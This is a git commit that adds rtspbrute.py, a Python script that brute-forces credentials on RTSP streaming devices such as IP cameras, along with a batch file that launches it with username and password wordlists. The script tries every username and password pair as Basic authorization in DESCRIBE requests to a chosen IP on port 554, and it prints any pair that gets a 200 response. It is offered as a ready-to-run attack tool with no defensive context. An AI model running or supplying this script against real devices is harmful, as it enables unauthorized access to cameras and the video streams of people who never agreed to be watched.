aa05bf38319af048df3b0408aff92edabacd4a1d
SiberianHacker <115571334+SiberianHacker@users.noreply.github.com>
2023-05-12 07:16:35 +0300

    Tested on win 7-10
    pip install rtsp

---
+++ rtspbrute.py
@@ -0,0 +1,54 @@
+#!/usr/local/bin/python3
+import socket
+import sys
+import itertools
+import base64
+import argparse
+import time
+from threading import Thread
+
+parser = argparse.ArgumentParser(add_help=True)
+
+parser.add_argument('-u', '--usernames', help='Specify the wordlist of usernames (colon separated)[FILE]')
+parser.add_argument('-P', '--passwords', help='Specify the wordlist of passwords (colon separated)[FILE]')
+args = parser.parse_args()
+
+usernamesnpasswords = args.usernames, args.passwords
+ip = input("IP: ")
+port = 554
+
+lists = []
+for u in usernamesnpasswords:
+    words = []
+    with open(u) as fp:
+        for line in fp:
+            words.append(line.rstrip())
+    lists.append(words)
+def b64Passwords(): 
+    for element in itertools.product(*lists):
+        passw = ":".join(element)
+        passwToBytes = passw.encode('ascii')
+        passwToB64 = base64.b64encode(passwToBytes)
+        passwF = passwToB64.decode('ascii')
+
+        def request():
+            req = "DESCRIBE rtsp://"+ip+":"+ str(port)+" RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic "+str(passwF)+"\r\n\r\n"
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, int(port)))
+            encodereq = req.encode('ascii')
+            s.sendall(encodereq)
+            data = s.recv(1024)
+            response = data.decode('ascii')
+            passwFDecoded = base64.b64decode(passwF.encode('ascii')).decode('ascii')
+            print("Trying password " + str(passwFDecoded))
+            if "404 Not Found" in response:
+                pass
+            elif "401" in response:
+                pass
+            elif "200" in response:
+                print("Found credentials!\n"+"Request:\n"+req+"\n"+"Response: \n"+response+"\n"+"Base64 encoded password: "+passwF+"\nPassword: "+str(passwFDecoded)+"\r\n")
+                exit()
+            else:
+                print("[HackEngineNobody] Error (unreachable host or timedout)")
+        request()
+b64Passwords()
---
+++ start_rtsp_brute.bat
@@ -0,0 +1,4 @@
+color c
+cls
+python rtspbrute.py -u users.txt -P min_pass.txt
+pause
